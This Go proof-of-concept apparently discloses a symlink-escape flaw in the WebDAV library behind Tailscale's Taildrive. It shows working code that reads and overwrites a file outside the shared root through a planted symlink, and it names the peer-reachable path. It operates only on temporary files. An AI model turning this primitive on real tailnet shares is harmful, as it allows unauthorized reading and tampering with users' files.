// PoC: tailscale/xnet/webdav.Dir (the exact WebDAV filesystem Taildrive uses in
// drive/driveimpl/fileserver.go) follows symlinks that point OUTSIDE the served
// root, giving a WebDAV client arbitrary file read/write as the serving user.
//
// This demonstrates the library-level primitive. In Tailscale it is reached by a
// tailnet peer granted a Taildrive share:
//   peerapi /v0/drive -> ServeHTTPWithPerms -> compositedav -> webdav.Dir(share).OpenFile
//
// Run:  go run .
package main

import (
	"context"
	"fmt"
	"os"
	"path/filepath"

	"github.com/tailscale/xnet/webdav"
)

func main() {
	// 1. A victim "share" root, as Taildrive would serve it.
	share, _ := os.MkdirTemp("", "taildrive-share-")
	defer os.RemoveAll(share)

	// 2. A sensitive file OUTSIDE the share (stand-in for /etc/passwd, a key, etc.)
	secretDir, _ := os.MkdirTemp("", "outside-")
	defer os.RemoveAll(secretDir)
	secret := filepath.Join(secretDir, "secret.txt")
	os.WriteFile(secret, []byte("TOP-SECRET: this file is OUTSIDE the share root\n"), 0600)

	// 3. A symlink inside the share pointing outside (the realistic precondition:
	//    a shared home/project dir containing a symlink). The attacker does NOT
	//    create this over WebDAV; it pre-exists in the shared tree.
	link := filepath.Join(share, "link")
	os.Symlink(secret, link)

	// 4. Taildrive constructs exactly this: webdav.Dir(sharePath).
	fs := webdav.Dir(share)

	// 5. A share-granted peer requests "/link" over WebDAV -> OpenFile follows it.
	f, err := fs.OpenFile(context.Background(), "/link", os.O_RDONLY, 0)
	if err != nil {
		fmt.Println("read blocked:", err)
	} else {
		buf := make([]byte, 256)
		n, _ := f.Read(buf)
		f.Close()
		fmt.Printf("[READ ESCAPE] GET /link returned out-of-root file:\n  %q\n", string(buf[:n]))
	}

	// 6. And a "..".. attempt, to show that IS blocked (contrast).
	if _, err := fs.OpenFile(context.Background(), "/../../etc/hostname", os.O_RDONLY, 0); err != nil {
		fmt.Println("[CONTROL] '..' traversal correctly blocked:", err)
	}

	// 7. Write escape (rw grant): write THROUGH the symlink to the outside file.
	w, err := fs.OpenFile(context.Background(), "/link", os.O_WRONLY|os.O_TRUNC, 0)
	if err == nil {
		w.Write([]byte("OVERWRITTEN by a WebDAV peer through the symlink\n"))
		w.Close()
		data, _ := os.ReadFile(secret)
		fmt.Printf("[WRITE ESCAPE] out-of-root file now contains:\n  %q\n", string(data))
	}
}
